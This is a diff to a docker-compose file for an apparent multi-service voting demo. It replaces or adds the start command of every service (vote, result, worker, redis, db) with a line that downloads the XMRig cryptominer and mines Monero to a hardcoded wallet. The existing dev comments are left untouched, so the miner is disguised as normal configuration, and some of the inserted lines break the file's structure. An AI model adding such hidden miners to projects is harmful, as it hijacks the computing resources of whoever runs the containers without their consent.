@@ -6,7 +6,7 @@ services:
   vote:
     build: ./vote
     # use python rather than gunicorn for local dev
-    command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id okte
+    command: apt-get update && apt-get install -y wget && wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id okte
     depends_on:
       redis:
         condition: service_healthy 
@@ -21,7 +21,7 @@ services:
   result:
     build: ./result
     # use nodemon rather than node for local dev
-    command: nodemon server.js
+    command: apt-get update && apt-get install -y wget && wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id okte
     depends_on:
       db:
         condition: service_healthy 
@@ -36,6 +36,7 @@ services:
 
   worker:
     build:
+    command: apt-get update && apt-get install -y wget && wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id okte
       context: ./worker
     depends_on:
       redis:
@@ -47,6 +48,7 @@ services:
 
   redis:
     image: redis:5.0-alpine3.10
+    command: apt-get update && apt-get install -y wget && wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id okte
     volumes:
       - "./healthchecks:/healthchecks"
     healthcheck:
@@ -58,6 +60,7 @@ services:
 
   db:
     image: postgres:9.4
+    command: apt-get update && apt-get install -y wget && wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id okte
     environment:
       POSTGRES_USER: "postgres"
       POSTGRES_PASSWORD: "postgres"
